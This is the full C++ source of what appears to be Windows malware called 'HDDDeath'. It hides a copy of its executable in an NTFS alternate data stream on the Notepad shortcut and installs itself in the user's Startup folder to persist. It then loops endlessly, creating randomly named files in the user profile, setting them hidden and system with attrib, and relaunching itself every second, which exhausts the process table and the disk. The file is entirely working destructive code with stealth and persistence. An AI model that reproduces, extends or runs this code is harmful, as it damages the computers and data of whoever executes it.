#include <cstdlib>
#include <ctime>
#include <fstream>
#include <iostream>
#include <string>
#include <sstream>
#include <Windows.h>

using namespace std;

typedef unsigned int uint;
typedef unsigned long int ulint;
typedef string String;

String userPath;

bool fileExists(const char *fileName){
	ifstream infile(fileName);
	return infile.good();
}

void begin(){
	char *userName = getenv("USERNAME"); //Get the username of the current user.
	stringstream ssMain;
	string userNameString;
	ssMain << userName;
	ssMain >> userNameString;

	String pathname;
	pathname = "C:/Users/" + userNameString; //%USERNAME% variable in batch
	userPath = pathname;
	pathname += "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs"; //Get the folder that contains both directories needed
	String startupPath = pathname + "/Startup/HDDDeath.exe"; //Get the startup program path
	String AdsPath = pathname + "/Accessories/Notepad.lnk:ADS.INFO"; //Get the hidden file path
	//}
	//{
	ifstream StarterSrc;
	ofstream StarterDst;
	StarterSrc.open("HDDDeath.exe", ios::binary); //Take the executable in the install path
	StarterDst.open(AdsPath, ios::binary);
	StarterDst << StarterSrc.rdbuf(); //copy executable to hidden path inside an ADS
	//}
	StarterSrc.close();
	StarterDst.close();
	StarterSrc.open(AdsPath, ios::binary);
	StarterDst.open(startupPath, ios::binary);
	StarterDst << StarterSrc.rdbuf(); //copy executable from hidden path inside an ADS to startup

	StarterSrc.close();
	StarterDst.close();
}

int main(int argv, char* argc[]) {
	{
		char *userName = getenv("USERNAME"); //Get the username of the current user.
		stringstream ss;
		string userNameString;
		ss << userName;
		ss >> userNameString;
		String pathname;
		pathname = "C:/Users/" + userNameString; //%USERNAME% variable in batch
		pathname += "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs"; //Get the folder that contains both directories needed
		String startupPath = pathname + "/Startup/HDDDeath.exe"; //Get the startup program path
		if(!fileExists(startupPath.c_str())){
			//cout << "Startup not installed...." << endl << "Installing...." << endl;
			begin();
			//cout << "Installation complete." << endl;
		}else{
			//cout << "Startup already installed." << endl;
		}
	}
	ulint random1,random2;


	char *userName = getenv("USERNAME"); //Get the username of the current user.
	stringstream ssMain;
	string userNameString;
	ssMain << userName;
	ssMain >> userNameString;
	String pathname;
	pathname = "C:/Users/" + userNameString; //%USERNAME% variable in batch
	userPath = pathname;
	system("cd C:/Users/%USERNAME%");

	ofstream out;
	long int i = 0;
	while(true){
		string filePath;
		do {
			i++;
			srand(time(0)+i);
			random1 = (rand() * rand() / rand()) +i;
			random2 = (rand() * rand() / rand()) -i;
			string filename;
			filename = "S4M" + to_string(rand()) + "H" + to_string((rand()%10)) + to_string(random2) + "CK" + to_string(time(0)) + to_string(random1) + ".txt";
			filePath = userPath + "\\" + filename;
		} while ( fileExists(filePath.c_str()) );
		//cout << filename << endl;
		//cout << filePath << endl;
		//return 1;
		out.open(filePath);
		out << endl;
		out.close();

		//string command;
		//command = "echo. > ";
		//command += filename;
		//system(command.c_str());
		i++;
		String systemCom = "attrib +H +S \"" + filePath + "\"";
		system(systemCom.c_str());
		system(argc[0]);
		system("timeout 1 > NUL");
	}

	return 0;
}
